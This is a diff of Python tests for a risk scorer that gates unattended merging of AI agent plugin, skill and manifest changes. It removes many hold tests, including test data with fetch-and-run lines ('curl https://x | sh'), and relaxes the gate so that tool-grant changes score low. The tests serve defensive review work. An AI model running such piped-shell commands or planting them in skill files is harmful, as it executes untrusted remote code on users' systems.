-            _file("plugins/foo/reference/tool", mode="100755"),
+            "plugins/foo/monitors/monitors.json",
+            "docs/conventions/x.md",
+            "REVIEW.md",
+            "plugins/review/skills/x/SKILL.md",
+            "plugins/source-control/skills/babysit-prs/scripts/babysit_risk.py",
+            "plugins/source-control/skills/babysit-loop/SKILL.md",
+            "plugins/source-control/lib/x.awk",
+            "plugins/work-items/x.md",
+            "plugins/autonomy/reference/guardrails/x.md",
+            "scripts/x.sh",
+            "lib/x.sh",
+            ".gitleaks.toml",
+            ".work-item-tracker.json",
+            ".node-version",
+            ".python-version",
+            ".gitattributes",
+            ".github/scripts/pr-merge/x.mjs",
+            "plugins/foo/evals/case/case.yaml",
+            "plugins/foo/evals/case/scaffold.sh",
         ):
-            with self.subTest(changed.path):
-                result = score(_lane_input((changed,)))
-                self.assertEqual(result.score, Risk.LOW, _codes(result))
+            with self.subTest(path):
+                result = score(_lane_input((_file(path),)))
+                self.assertEqual(result.score, Risk.LOW, result.reasons)
 
-    def test_an_unreadable_script_scope_list_fails_closed(self):
-        result = score(_input(files=(_file("docs/a.md"),), floor_script_scopes=("**",)))
-        self.assertIn("high-path:**", _codes(result))
-
-    def test_a_path_outside_the_floor_stays_low(self):
-        files = (_file("plugins/foo/skills/bar/reference/notes.md"),)
-        result = score(_lane_input(files))
-        self.assertEqual(result.score, Risk.LOW, _codes(result))
-
-    def test_a_skill_diff_adding_allowed_tools_is_held(self):
+    def test_a_capability_change_merges(self):
         after = FRONT.replace("y\n", "y\nallowed-tools: Bash\n", 1)
         result = score(_lane_input((_edit(SKILL, FRONT, after),)))
-        self.assertEqual(result.score, Risk.HIGH, _codes(result))
-        self.assertIn("high-capability", _codes(result))
+        self.assertEqual(result.score, Risk.LOW, result.reasons)
 
-    def test_a_prose_only_skill_diff_is_not_held(self):
-        after = FRONT + "Then read the report it prints.\n"
-        result = score(_lane_input((_edit(SKILL, FRONT, after),)))
-        self.assertEqual(result.score, Risk.LOW, _codes(result))
-
-
-def _front(*lines, body="# X\n\nBody.\n"):
-    return "---\n" + "".join(f"{line}\n" for line in lines) + "---\n\n" + body
-
-
-ECHO_BODY = '```!\necho "```"\n' + "".join(f"s{i}\n" for i in range(8)) + "```\n"
-BANG_BODY = (
-    "## Env\n\n```!\n" + "".join(f"step {i}\n" for i in range(1, 9)) + "```\n\nDone.\n"
-)
-
-
-class CapabilityTriggerTests(unittest.TestCase):
-    """Owner decisions Q641 and 2026-10-18: with the floor, a SKILL.md,
-    agents/**/*.md or commands/**/*.md file whose head text gains or changes a
-    capability frontmatter key, adds a `!` command, or changes a line inside a
-    ```! block, compared with its base text, scores HIGH. Each case is a base
-    and head text pair."""
-
-    HELD = [
-        (
-            "agent permissionMode added",
-            "plugins/foo/agents/runner.md",
-            _front("name: r"),
-            _front("name: r", "permissionMode: acceptEdits"),
-        ),
-        (
-            "command adds an inline command",
-            "plugins/foo/commands/go.md",
-            _front("name: g"),
-            _front("name: g", body="Branch: !`git branch`\n"),
-        ),
-        (
-            "an allowed-tools list item added",
-            SKILL,
-            _front("name: x", "allowed-tools:", '  - "Bash(git status*)"'),
-            _front(
-                "name: x",
-                "allowed-tools:",
-                '  - "Bash(git status*)"',
-                '  - "Bash(git push*)"',
-            ),
-        ),
-        (
-            "hooks removed",
-            SKILL,
-            _front("name: x", "hooks:", "  Stop: x"),
-            _front("name: x"),
-        ),
-        (
-            "mcpServers changed",
-            "plugins/foo/agents/runner.md",
-            _front("name: r", "mcpServers: [a]"),
-            _front("name: r", "mcpServers: [a, b]"),
-        ),
-        (
-            "agent tools line deleted, which grants every tool",
-            "plugins/foo/agents/runner.md",
-            _front("name: r", "tools: Read"),
-            _front("name: r"),
-        ),
-        (
-            "agent disallowedTools dropped",
-            "plugins/foo/agents/runner.md",
-            _front("name: r", "disallowedTools: Bash"),
-            _front("name: r"),
-        ),
-        (
-            "a quoted allowed-tools key",
-            SKILL,
-            _front("name: x"),
-            _front("name: x", '"allowed-tools": Bash'),
-        ),
-        (
-            "closing delimiter moved below body lines",
-            SKILL,
-            "---\nname: x\n---\n# X\nallowed-tools: Bash\n",
-            "---\nname: x\n# X\nallowed-tools: Bash\n---\n",
-        ),
-        (
-            "zero-indent list item added under allowed-tools",
-            SKILL,
-            _front("name: x", "allowed-tools:", "- Read"),
-            _front("name: x", "allowed-tools:", "- Read", "- Bash"),
-        ),
-        (
-            "a removed sibling key moves its items under allowed-tools",
-            SKILL,
-            _front("allowed-tools:", "  - Read", "other:", '  - "Bash(*)"'),
-            _front("allowed-tools:", "  - Read", '  - "Bash(*)"'),
-        ),
-        (
-            "frontmatter rewritten as a flow mapping",
-            SKILL,
-            _front("name: x"),
-            _front("{name: x, allowed-tools: Bash(*)}"),
-        ),
-        (
-            "a tagged key",
-            SKILL,
-            _front("name: x"),
-            _front("name: x", "!!str allowed-tools: Bash(*)"),
-        ),
-        (
-            "an explicit key",
-            SKILL,
-            _front("name: x"),
-            _front("name: x", "? allowed-tools", ": Bash(*)"),
-        ),
-        (
-            "a merge key",
-            SKILL,
-            _front("name: x"),
-            _front("name: x", "x-b: &b {allowed-tools: Bash(*)}", "<<: *b"),
-        ),
-        (
-            "an anchor the base already aliases under allowed-tools",
-            SKILL,
-            _front("x-t: &t Read", "allowed-tools: *t"),
-            _front("x-t: &t Bash(*)", "allowed-tools: *t"),
-        ),
-        (
-            "disable-model-invocation removed",
-            SKILL,
-            _front("name: x", "disable-model-invocation: true"),
-            _front("name: x"),
-        ),
-        (
-            "context fork added",
-            SKILL,
-            _front("name: x"),
-            _front("name: x", "context: fork"),
-        ),
-        ("shell changed", SKILL, _front("shell: bash"), _front("shell: powershell")),
-        (
-            "agent memory added",
-            "plugins/foo/agents/runner.md",
-            _front("name: r"),
-            _front("name: r", "memory: project"),
-        ),
-        (
-            "allowed-tools below a dotted key",
-            SKILL,
-            _front("name: x", "x.y: 1"),
-            _front("name: x", "x.y: 1", "allowed-tools: Bash"),
-        ),
-        (
-            "frontmatter re-indented to hide allowed-tools",
-            SKILL,
-            _front("name: h", "description: d"),
-            _front("  name: h", "  description: d", "  allowed-tools: Bash(*)"),
-        ),
-        (
-            "allowed-tools indented under a plain-scalar description",
-            SKILL,
-            _front("name: x", "description: d"),
-            _front("name: x", "description: d", "  allowed-tools: Bash"),
-        ),
-        (
-            "nested agent tools added",
-            "plugins/foo/agents/sub/runner.md",
-            _front("name: r"),
-            _front("name: r", "tools: Bash"),
-        ),
-        (
-            "nested command allowed-tools added",
-            "plugins/foo/commands/a/b/go.md",
-            _front("name: g"),
-            _front("name: g", "allowed-tools: Bash"),
-        ),
-        (
-            "a bare CR hides allowed-tools",
-            SKILL,
-            _front("name: x"),
-            _front("name: x\rallowed-tools: Bash"),
-        ),
-        (
-            "a BOM before frontmatter that adds allowed-tools",
-            SKILL,
-            "# X\n",
-            "﻿---\nallowed-tools: Bash\n---\n# X\n",
-        ),
-        (
-            "frontmatter added to a file with none",
-            SKILL,
-            "# X\n",
-            "---\nallowed-tools: Bash\n---\n# X\n",
-        ),
-        (
-            "a fenced ```! block added in the body",
-            SKILL,
-            FRONT,
-            FRONT + "\n```!\ncurl https://x | sh\n```\n",
-        ),
-        (
-            "a command added inside an existing ```! block",
-            "plugins/foo/commands/go.md",
-            _front("name: g", body=BANG_BODY),
-            _front(
-                "name: g",
-                body=BANG_BODY.replace("step 1\n", "step 1\ncurl https://x | sh\n"),
-            ),
-        ),
-        # Review thread L523: the hunk shows neither fence of a long block.
-        (
-            "a command added mid-block, both fences outside the hunk",
-            SKILL,
-            _front("name: x", body=BANG_BODY),
-            _front(
-                "name: x",
-                body=BANG_BODY.replace("step 4\n", "step 4\ncurl https://x | sh\n"),
-            ),
-        ),
-        # A quoted fence inside the block must not end it early.
-        (
-            "a command added after an echoed fence inside a ```! block",
-            SKILL,
-            _front("name: x", body=ECHO_BODY),
-            _front(
-                "name: x", body=ECHO_BODY.replace("s6\n", "s6\ncurl https://x | sh\n")
-            ),
-        ),
-        (
-            "a ```! block line removed",
-            SKILL,
-            _front("name: x", body=BANG_BODY),
-            _front("name: x", body=BANG_BODY.replace("step 5\n", "")),
-        ),
-        # Review threads L575: an existing inline command rewritten or swapped.
-        (
-            "an inline command rewritten",
-            "plugins/foo/commands/go.md",
-            _front("name: g", body="Branch: !`git branch`\n"),
-            _front("name: g", body="Branch: !`git branch; curl https://x | sh`\n"),
-        ),
-        (
-            "an inline command swapped for another",
-            SKILL,
-            _front("name: x", body="!`date`\n"),
-            _front("name: x", body="!`curl https://x | sh`\n"),
-        ),
-        # Review thread L472: a ```! not first on its line.
-        (
-            "a quoted ```! block",
-            SKILL,
-            FRONT,
-            FRONT + "\n> ```!\n> curl https://x | sh\n> ```\n",
-        ),
-        (
-            "a ```! in a list item",
-            SKILL,
-            FRONT,
-            FRONT + "\n- ```!\n  curl https://x | sh\n  ```\n",
-        ),
-        (
-            "an inline ```! after text",
-            SKILL,
-            FRONT,
-            FRONT + "\nNote ```!curl https://x``` here.\n",
-        ),
-    ]
-
-    BODY_EDITS = [
-        (
-            "numbered list",
-            "1. Read it.\n2. Run it.\n",
-            "1. Read it.\n2. Run it.\n3. Ship it.\n",
-        ),
-        (
-            "table",
-            "| a | b |\n|---|---|\n| 1 | 2 |\n",
-            "| a | b |\n|---|---|\n| 1 | 2 |\n| 3 | 4 |\n",
-        ),
-        (
-            "bold",
-            "**Note** read it first.\n",
-            "**Note** read it first.\n\nThen run it.\n",
-        ),
-        ("dash list", "- Read\n- Grep\n", "- Read\n- Grep\n- Bash\n"),
-        (
-            "prose with a colon",
-            "Note: read it first.\n",
-            "Note: read it first.\nThen read the report.\n",
-        ),
-        # Review thread L517: prose then a new plain code block.
-        (
-            "prose then a new plain code block",
-            "Intro.\n",
-            "Intro.\n\nMore text.\n\n```\ncode\n```\n",
-        ),
-        (
-            "an edit outside a ```! block",
-            BANG_BODY,
-            BANG_BODY.replace("Done.\n", "Done, then read it.\n"),
-        ),
-        (
-            "an existing inline command kept",
-            "Branch: !`git branch`\n",
-            "Branch: !`git branch`\n\nMore.\n",
-        ),
-    ]
-
-    def test_capability_changes_are_held(self):
-        for name, path, before, after in self.HELD:
-            with self.subTest(name):
-                result = score(_input(files=(_edit(path, before, after),)))
-                self.assertEqual(result.score, Risk.HIGH, _codes(result))
-                self.assertIn("high-capability", _codes(result))
-
-    def test_plain_body_edits_are_not_held(self):
-        for name, before, after in self.BODY_EDITS:
-            with self.subTest(name):
-                changed = _edit(
-                    SKILL, _front("name: x", body=before), _front("name: x", body=after)
-                )
-                result = score(_input(files=(changed,)))
-                self.assertEqual(result.score, Risk.LOW, _codes(result))
-
-    def test_a_description_edit_is_not_held(self):
-        changed = _edit(
-            SKILL,
-            _front("name: x", "description: Old."),
-            _front("name: x", "description: New."),
-        )
-        self.assertEqual(score(_input(files=(changed,))).score, Risk.LOW)
-
-    def test_a_block_scalar_description_edit_is_not_held(self):
-        # Its indented lines are text, even one shaped like a key.
-        for header in ("description: |", "description: >-"):
-            with self.subTest(header):
-                changed = _edit(
-                    SKILL,
-                    _front("name: x", header, "  Old.", "  Note: read it."),
-                    _front("name: x", header, "  New.", "  Note: read it."),
-                )
-                result = score(_input(files=(changed,)))
-                self.assertEqual(result.score, Risk.LOW, _codes(result))
-
-    def test_an_alias_at_a_value_start_reads_as_unfollowable(self):
-        # Fail closed: an alias, anchor or tag at a node start is not read.
-        for value in ("*b", "&b x", "!!str x"):
-            with self.subTest(value):
-                changed = _edit(
-                    SKILL, _front("description: a"), _front(f"description: {value}")
-                )
-                self.assertIn(
-                    "high-capability", _codes(score(_input(files=(changed,))))
-                )
-        # Review thread L470: a node start after a second block indicator.
-        for line in ("  - - *a", "  - - &a x", "  - ? *a", "  ? *a"):
-            with self.subTest(line):
-                changed = _edit(SKILL, _front("foo:", "  - a"), _front("foo:", line))
-                self.assertIn(
-                    "high-capability", _codes(score(_input(files=(changed,))))
-                )
-
-    def test_a_description_edit_beside_wildcard_tool_grants_is_not_held(self):
-        # Review thread L466: `*` inside a plain or quoted scalar is text.
-        for grant in (
-            "allowed-tools: Bash(playwright-cli:*)",
-            "allowed-tools: Bash(git *)",
-            'allowed-tools: ["Bash(${CLAUDE_SKILL_DIR}/scripts/x.sh:*)"]',
-            "description2: see *b and & c!",
-        ):
-            with self.subTest(grant):
-                changed = _edit(
-                    SKILL,
-                    _front(grant, "description: Old."),
-                    _front(grant, "description: New."),
-                )
-                result = score(_input(files=(changed,)))
-                self.assertEqual(result.score, Risk.LOW, _codes(result))
-
-    def test_plugin_monitors_and_workflows_are_on_the_floor(self):
-        for path in (
-            "plugins/foo/monitors/monitors.json",
-            "plugins/foo/workflows/sweep.js",
-        ):
-            with self.subTest(path):
-                result = score(_input(files=(_file(path),)))
-                self.assertEqual(result.score, Risk.HIGH, _codes(result))
-
-    RENAMED = [
-        ("agents", "plugins/foo/agents/runner.md"),
-        ("commands", "plugins/foo/commands/go.md"),
-        ("skills", SKILL),
-    ]
-
-    def test_a_rename_or_copy_into_a_capability_path_is_held(self):
-        text = _front("allowed-tools: Bash")
-        for status in ("renamed", "copied"):
-            for name, path in self.RENAMED:
-                with self.subTest(status=status, into=name):
-                    changed = _file(
-                        path,
-                        status=status,
-                        previous_path="plugins/foo/reference/notes.md",
-                        additions=0,
-                        deletions=0,
-                        contents=(text, text),
-                    )
-                    result = score(_input(files=(changed,)))
-                    self.assertEqual(result.score, Risk.HIGH, _codes(result))
-                    self.assertIn("high-capability", _codes(result))
-
-    def test_unread_or_unreadable_contents_are_held(self):
-        for changed in (
-            _file(SKILL, contents=None),
-            dataclasses.replace(_file(SKILL), contents_error="status 502"),
-        ):
-            with self.subTest(contents=changed.contents, error=changed.contents_error):
-                self.assertIn(
-                    "high-capability", _codes(score(_input(files=(changed,))))
-                )
-
-    def test_a_changed_bang_file_with_no_patch_text_is_held(self):
-        before = _front("name: x", body=BANG_BODY)
-        changed = _file(SKILL, has_patch=False, contents=(before, before + "More.\n"))
-        self.assertIn("high-capability", _codes(score(_input(files=(changed,)))))
-
-    def test_a_removed_capability_file_is_not_read(self):
-        changed = _file(SKILL, status="removed", previous_mode=None, contents=None)
-        self.assertNotIn("high-capability", _codes(score(_input(files=(changed,)))))
-
-    def test_a_non_capability_markdown_file_is_not_read(self):
-        changed = _file("plugins/foo/skills/bar/reference/notes.md", contents=None)
-        self.assertEqual(score(_input(files=(changed,))).score, Risk.LOW)
-
-    def test_the_floor_off_reads_no_capability(self):
-        changed = _edit(
-            SKILL, FRONT, FRONT.replace("y\n", "y\nallowed-tools: Bash\n", 1)
-        )
-        result = score(_input(files=(changed,), high_floor=False))
-        self.assertEqual(result.score, Risk.LOW, _codes(result))
-
-
-DMI = FRONT.replace("y\n", "y\ndisable-model-invocation: true\n", 1)
-OTHER_AGENT = ("plugins/foo/agents/a.md", "---\nname: a\nskills:\n  - foo:other\n---\n")
-
-
-class DisableModelInvocationTests(unittest.TestCase):
-    """Adding only `disable-model-invocation: true` to a skill's frontmatter
-    takes no capability hold unless an agent could preload the skill."""
-
-    def test_adding_only_the_line_with_no_preloading_agent_is_low(self):
-        result = score(_input(files=(_edit(SKILL, FRONT, DMI),), agents=(OTHER_AGENT,)))
-        self.assertEqual(result.score, Risk.LOW, _codes(result))
-
-    def test_agents_not_read_holds(self):
-        result = score(_input(files=(_edit(SKILL, FRONT, DMI),)))
-        self.assertEqual(_codes(result), ("high-capability",))
-
-    def test_a_preloading_or_unreadable_agent_holds(self):
-        for agent in (
-            ("plugins/x/agents/a.md", "---\nname: a\nskills:\n  - foo:bar\n---\n"),
-            ("plugins/x/agents/a.md", "---\nname: a\nskills:\n  - foo:x\n---\n"),
-            (".claude/agents/a.md", "---\nskills: [bar]\n---\n"),
-            ("plugins/x/agents/a.md", None),
-            ("plugins/x/agents/a.md", "---\nskills: &a bar\n---\n"),
-        ):
-            with self.subTest(agent=agent):
-                result = score(
-                    _input(files=(_edit(SKILL, FRONT, DMI),), agents=(agent,))
-                )
-                self.assertEqual(_codes(result), ("high-capability",))
-
-    def test_an_agent_changed_in_the_diff_that_preloads_the_skill_holds(self):
-        agent = _edit(
-            "plugins/foo/agents/a.md",
-            "---\nname: a\n---\n",
-            "---\nname: a\nskills:\n  - foo:bar\n---\n",
-        )
-        result = score(
-            _input(files=(_edit(SKILL, FRONT, DMI), agent), agents=(OTHER_AGENT,))
-        )
-        reasons = {r.code: r.detail for r in result.reasons}
-        self.assertIn(SKILL, reasons.get("high-capability", ""))
-
-    def test_any_other_frontmatter_or_body_change_holds(self):
-        for after in (
-            FRONT.replace("y\n", "y\ndisable-model-invocation: false\n", 1),
-            DMI.replace("description: y", "description: z"),
-            DMI.replace("Body.", "Body, reworded."),
-            FRONT.replace(
-                "y\n", "y\ndisable-model-invocation: true\nallowed-tools: Bash\n", 1
-            ),
-            FRONT.replace("y\n", "y\n  disable-model-invocation: true\n", 1),
-        ):
-            with self.subTest(after=after):
-                changed = _edit(SKILL, FRONT, after)
-                result = score(_input(files=(changed,), agents=(OTHER_AGENT,)))
-                self.assertIn("high-capability", _codes(result))
-
-    def test_the_line_splitting_a_continued_value_holds(self):
-        before = FRONT.replace("y\n", "y\n  more\n", 1)
-        after = before.replace("y\n", "y\ndisable-model-invocation: true\n", 1)
-        result = score(
-            _input(files=(_edit(SKILL, before, after),), agents=(OTHER_AGENT,))
-        )
-        self.assertEqual(_codes(result), ("high-capability",))
-
-    def test_changing_an_existing_value_to_true_holds(self):
-        before = FRONT.replace("y\n", "y\ndisable-model-invocation: false\n", 1)
-        result = score(
-            _input(files=(_edit(SKILL, before, DMI),), agents=(OTHER_AGENT,))
-        )
-        self.assertEqual(_codes(result), ("high-capability",))
-
-    def test_an_agent_or_a_skill_outside_plugin_skills_holds(self):
-        for path in ("plugins/foo/agents/bar.md", ".claude/skills/bar/SKILL.md"):
-            with self.subTest(path):
-                result = score(
-                    _input(files=(_edit(path, FRONT, DMI),), agents=(OTHER_AGENT,))
-                )
-                self.assertIn("high-capability", _codes(result))
-
-    def test_a_floored_skill_keeps_its_path_hold(self):
-        path = "plugins/review/skills/bar/SKILL.md"
-        result = score(_input(files=(_edit(path, FRONT, DMI),), agents=(OTHER_AGENT,)))
-        self.assertEqual(_codes(result), ("high-path:plugins/review/**",))
-
-    def test_a_mixed_change_holds(self):
-        files = (_edit(SKILL, FRONT, DMI), _file("plugins/foo/scripts/run.sh"))
-        codes = _codes(score(_input(files=files, agents=(OTHER_AGENT,))))
-        self.assertIn("high-path:plugins/*/scripts/**", codes)
-        self.assertNotIn("high-capability", codes)
-
-
-class EvalDataTests(unittest.TestCase):
-    """Non-script files under plugins/<plugin>/evals/ take no hold from the
-    floor's location entries or the capability check."""
-
-    def test_eval_data_under_floored_locations_is_low(self):
-        gains = _edit(
-            "plugins/foo/evals/stub/skills/y/SKILL.md",
-            FRONT,
-            FRONT.replace("y\n", "y\nallowed-tools: Bash\n", 1),
-        )
-        for files in (
-            (
-                _file("plugins/review/evals/case-a/prompt.md"),
-                _file("plugins/review/evals/case-a/case.yaml"),
-            ),
-            (_file("plugins/foo/evals/scripts/data.json"),),
-            (_file("plugins/foo/evals/case/fixture.sh.fixture"),),
-            (gains,),
-        ):
-            with self.subTest(files=[f.path for f in files]):
-                result = score(_input(files=files, eval_cases=()))
-                self.assertEqual(result.score, Risk.LOW, _codes(result))
-
-    def test_a_script_under_evals_holds(self):
-        for changed, code in (
-            (_file("plugins/review/evals/case-a/scaffold.sh"), "plugins/review/**"),
-            (_file("plugins/review/evals/case-a/run.PY"), "plugins/review/**"),
-            (
-                _file("plugins/review/evals/case-a/run", mode="100755"),
-                "plugins/review/**",
-            ),
-            (_file("plugins/foo/evals/scripts/grade.mjs"), "plugins/**/scripts/**"),
-        ):
-            with self.subTest(changed.path):
-                self.assertIn(
-                    f"high-path:{code}", _codes(score(_input(files=(changed,))))
-                )
-
-    def test_a_stub_manifest_under_evals_holds(self):
-        for name in ("plugin.json", "marketplace.json"):
-            path = f"plugins/foo/evals/case/stub/.claude-plugin/{name}"
-            with self.subTest(name):
-                self.assertIn(
-                    "high-path:**/.claude-plugin/**",
-                    _codes(score(_input(files=(_file(path),)))),
-                )
-
-    def test_a_named_floor_file_under_evals_holds(self):
-        for path, code in (
-            ("plugins/foo/evals/fixtures/CLAUDE.md", "**/CLAUDE.md"),
-            ("plugins/foo/evals/fixtures/.claude/settings.json", "**/.claude/**"),
-        ):
-            with self.subTest(path):
-                self.assertIn(
-                    f"high-path:{code}", _codes(score(_input(files=(_file(path),))))
-                )
-
-    def test_a_file_in_the_evals_plugin_outside_evals_holds(self):
-        result = score(_input(files=(_file("plugins/evals/probes/scripts/data.json"),)))
-        self.assertIn("high-path:plugins/**/scripts/**", _codes(result))
-        skill = _edit(
-            "plugins/evals/skills/y/SKILL.md",
-            FRONT,
-            FRONT.replace("y\n", "y\nallowed-tools: Bash\n", 1),
-        )
-        self.assertIn("high-capability", _codes(score(_input(files=(skill,)))))
-        low = score(
-            _input(files=(_file("plugins/evals/evals/case/prompt.md"),), eval_cases=())
-        )
-        self.assertEqual(low.score, Risk.LOW, _codes(low))
-
-    def test_a_skill_level_or_differently_cased_evals_directory_holds(self):
-        for path in (
-            "plugins/review/skills/x/evals/case/prompt.md",
-            "plugins/review/Evals/case/prompt.md",
-        ):
-            with self.subTest(path):
-                self.assertIn(
-                    "high-path:plugins/review/**",
-                    _codes(score(_input(files=(_file(path),)))),
-                )
-
-    def test_a_traversal_path_holds(self):
-        path = "plugins/review/evals/../skills/x.md"
-        codes = _codes(score(_input(files=(_file(path),))))
-        self.assertIn("high-path:plugins/review/**", codes)
-
-    def test_a_rename_into_evals_holds(self):
-        moved = _file(
-            "plugins/review/evals/case/notes.md",
-            status="renamed",
-            previous_path="plugins/review/skills/x/notes.md",
-        )
-        self.assertIn(
-            "high-path:plugins/review/**", _codes(score(_input(files=(moved,))))
-        )
-
-    def test_a_denied_or_declared_eval_path_holds(self):
-        path = "plugins/review/evals/data/x.json"
-        denied = score(_input(files=(_file(path),), high_paths=("plugins/review/**",)))
-        self.assertIn("high-path:plugins/review/**", _codes(denied))
-        hooks = (
-            '{"hooks": {"Stop": [{"hooks": [{"command":'
-            ' "${CLAUDE_PLUGIN_ROOT}/evals/data/x.json"}]}]}}'
-        )
-        declared = score(
-            _input(
-                files=(_file(path),),
-                declarations=(("plugins/review/hooks/hooks.json", hooks),),
-            )
-        )
-        self.assertIn("high-path:plugins/review/**", _codes(declared))
-
-    def test_a_mixed_change_holds_on_its_non_eval_file(self):
-        files = (
-            _file("plugins/review/evals/case/prompt.md"),
-            _file("plugins/review/skills/x/notes.md"),
-        )
-        reasons = {r.code: r.detail for r in score(_input(files=files)).reasons}
-        self.assertEqual(
-            reasons.get("high-path:plugins/review/**"),
-            "plugins/review/skills/x/notes.md",
-        )
+    def test_a_pipeline_caps_edit_still_holds_as_cost(self):
+        patch = "@@ -1,1 +1,1 @@\n-  max-in-flight: 5\n+  max-in-flight: 50"
+        files = (_file("docs/conventions/pr-pipeline.yaml", patch=patch),)
+        self.assertEqual(_codes(score(_lane_input(files))), ("cost-review-required",))
 
 
 MANIFEST = "plugins/foo/.claude-plugin/plugin.json"
@@ -2357,9 +1219,9 @@ def _manifest_change(path, before, after, **kw):
 
 
 class ManifestTests(unittest.TestCase):
-    """A plugin or marketplace manifest leaves the floor only when every
-    parsed difference is on the allow-list; anything else, including the five
-    review classes, holds as manifest-review-required."""
+    """A manifest change holds as manifest-review-required only when it
+    installs or runs something new: an executable plugin.json key, or a
+    marketplace plugin added, removed, renamed or re-sourced."""
 
     REVIEW = "manifest-review-required"
 
@@ -2368,37 +1230,33 @@ class ManifestTests(unittest.TestCase):
             score(_input(files=(_manifest_change(path, before, after, **kw),)))
         )
 
-    def test_metadata_changes_clear(self):
+    def test_non_executable_changes_clear(self):
         for after in (
             PLUGIN_BASE.replace("1.0.0", "1.1.0"),
             PLUGIN_BASE.replace("Foo.", "Foo, reworded."),
-            PLUGIN_BASE.replace('"name": "foo",', '"name": "foo", "keywords": ["a"],'),
+            PLUGIN_BASE.replace('"default": true', '"default": false'),
+            PLUGIN_BASE.replace(
+                '"name": "foo",', '"name": "foo", "dependencies": ["bar"],'
+            ),
+            PLUGIN_BASE.replace('"version": "1.0.0", ', ""),
         ):
             with self.subTest(after=after):
                 self.assertEqual(self._codes(MANIFEST, PLUGIN_BASE, after), ())
-        renamed = MARKET_BASE.replace('"dev"', '"tools"')
-        self.assertEqual(self._codes(MARKETPLACE, MARKET_BASE, renamed), ())
-
-    def test_each_review_class_holds(self):
         for after in (
-            PLUGIN_BASE.replace('"default": true', '"default": false'),
-            PLUGIN_BASE.replace(
-                '{"guard_enabled": {"type": "boolean", "default": true}}', "{}"
+            MARKET_BASE.replace('"dev"', '"tools"'),
+            MARKET_BASE.replace(
+                '"name": "m",', '"name": "m", "metadata": {"pluginRoot": "x"},'
             ),
-            PLUGIN_BASE.replace(
-                '"userConfig": {',
-                '"userConfig": {"mode": {"type": "string", "options": ["a", "b"]}, ',
-            ),
-            PLUGIN_BASE.replace(
-                '"default": true', '"default": true, "options": [true, false]'
-            ),
+        ):
+            with self.subTest(after=after):
+                self.assertEqual(self._codes(MARKETPLACE, MARKET_BASE, after), ())
+
+    def test_an_executable_key_holds(self):
+        for after in (
             PLUGIN_BASE.replace(
                 '"name": "foo",', '"name": "foo", "hooks": "./h.json",'
             ),
             PLUGIN_BASE.replace('"name": "foo",', '"name": "foo", "mcpServers": {},'),
-            PLUGIN_BASE.replace(
-                '"name": "foo",', '"name": "foo", "dependencies": ["bar"],'
-            ),
             PLUGIN_BASE.replace(
                 '"name": "foo",', '"name": "foo", "experimental": {"monitors": []},'
             ),
@@ -2410,6 +1268,19 @@ class ManifestTests(unittest.TestCase):
                     self._codes(MANIFEST, PLUGIN_BASE, after), (self.REVIEW,)
                 )
 
+    def test_a_marketplace_add_remove_rename_or_source_holds(self):
+        for after in (
+            MARKET_BASE.replace("./plugins/foo", "https://example.com/foo.git"),
+            MARKET_BASE.replace("]}", ', {"name": "bar", "source": "./plugins/bar"}]}'),
+            MARKET_BASE.replace('"name": "foo"', '"name": "fob"'),
+            MARKET_BASE.replace('"name": "m"', '"name": "n"'),
+            '{"name": "m", "plugins": []}',
+        ):
+            with self.subTest(after=after):
+                self.assertEqual(
+                    self._codes(MARKETPLACE, MARKET_BASE, after), (self.REVIEW,)
+                )
+
     def test_a_denied_manifest_path_keeps_the_hold(self):
         bump = _manifest_change(
             MANIFEST, PLUGIN_BASE, PLUGIN_BASE.replace("1.0.0", "1.1.0")
@@ -2419,30 +1290,12 @@ class ManifestTests(unittest.TestCase):
         )
         self.assertIn("high-path:**/.claude-plugin/**", codes)
 
-    def test_a_marketplace_source_change_or_addition_holds(self):
-        for after in (
-            MARKET_BASE.replace("./plugins/foo", "https://example.com/foo.git"),
-            MARKET_BASE.replace("]}", ', {"name": "bar", "source": "./plugins/bar"}]}'),
-            MARKET_BASE.replace(
-                '"name": "m",', '"name": "m", "metadata": {"pluginRoot": "x"},'
-            ),
-            MARKET_BASE.replace('"category": "dev"', '"category": "dev", "hooks": {}'),
-        ):
-            with self.subTest(after=after):
-                self.assertEqual(
-                    self._codes(MARKETPLACE, MARKET_BASE, after), (self.REVIEW,)
-                )
-
     def test_unreadable_malformed_or_duplicate_sides_hold(self):
         duplicate = PLUGIN_BASE.replace('"name": "foo",', '"name": "foo", "name": "x",')
-        nested = PLUGIN_BASE.replace(
-            '"default": true', '"default": true, "default": false'
-        )
         for before, after in (
             (PLUGIN_BASE, "{"),
             ("not json", PLUGIN_BASE),
             (PLUGIN_BASE, duplicate),
-            (PLUGIN_BASE, nested),
             (PLUGIN_BASE, None),
             (PLUGIN_BASE, "[]"),
         ):
@@ -2455,411 +1308,103 @@ class ManifestTests(unittest.TestCase):
         )
         self.assertEqual(_codes(score(_input(files=(errored,)))), (self.REVIEW,))
 
-    def test_an_added_plugin_manifest_holds(self):
-        # Judged against an empty object, so its `name` is an added key.
+    def test_an_added_plugin_manifest_holds_only_with_an_executable_key(self):
         added = dict(status="added", previous_mode=None)
-        self.assertEqual(
-            self._codes(MANIFEST, None, PLUGIN_BASE, **added), (self.REVIEW,)
+        self.assertEqual(self._codes(MANIFEST, None, PLUGIN_BASE, **added), ())
+        hooked = PLUGIN_BASE.replace('"name": "foo",', '"name": "foo", "hooks": {},')
+        self.assertEqual(self._codes(MANIFEST, None, hooked, **added), (self.REVIEW,))
+
+    def test_a_removed_or_renamed_manifest_holds(self):
+        removed = dict(status="removed", additions=0, previous_mode=None)
+        self.assertIn(self.REVIEW, self._codes(MANIFEST, PLUGIN_BASE, None, **removed))
+        renamed = dict(status="renamed", previous_path="plugins/foo/plugin.json")
+        self.assertIn(
+            self.REVIEW, self._codes(MANIFEST, PLUGIN_BASE, PLUGIN_BASE, **renamed)
         )
 
-    def test_other_claude_plugin_files_keep_the_floor_hold(self):
-        for path in (
-            "plugins/foo/.claude-plugin/extra.json",
-            "plugins/foo/evals/case/stub/.claude-plugin/plugin.json",
-            "plugins/foo/.claude-plugin/marketplace.json",
-        ):
-            with self.subTest(path):
-                codes = self._codes(path, PLUGIN_BASE, PLUGIN_BASE)
-                self.assertIn("high-path:**/.claude-plugin/**", codes)
 
-    def test_a_mixed_change_holds_on_the_other_file(self):
-        manifest = _manifest_change(
-            MANIFEST, PLUGIN_BASE, PLUGIN_BASE.replace("1.0.0", "1.1.0")
+class HoldsTests(unittest.TestCase):
+    """#9270: a MED score merges unattended when every reason is a class or
+    size reason; every other reason holds."""
+
+    def _holds(self, **changes):
+        return holds(score(_input(**changes)))
+
+    def test_low_does_not_hold(self):
+        self.assertFalse(self._holds())
